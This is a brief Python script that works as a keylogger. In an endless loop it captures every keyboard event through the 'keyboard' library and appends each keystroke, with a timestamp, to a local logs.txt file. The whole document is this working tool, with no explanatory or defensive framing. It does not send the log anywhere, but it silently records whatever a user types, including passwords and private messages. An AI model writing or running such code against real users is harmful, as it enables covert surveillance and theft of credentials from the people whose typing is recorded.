import keyboard
import datetime

def keylog():
        log = str(keyboard.read_event())
        logs = open('logs.txt', 'a')
        current_date_time = datetime.datetime.now().strftime("[%m/%d/%Y %H:%M:%S]")
        j = log.replace('KeyboardEvent', '')
        j = j.replace(j[0], '')
        j = j.replace(j[-1], '')
        logs.write(f"{current_date_time}: {j}\n")
if __name__=='__main__':
    while True:
        keylog()
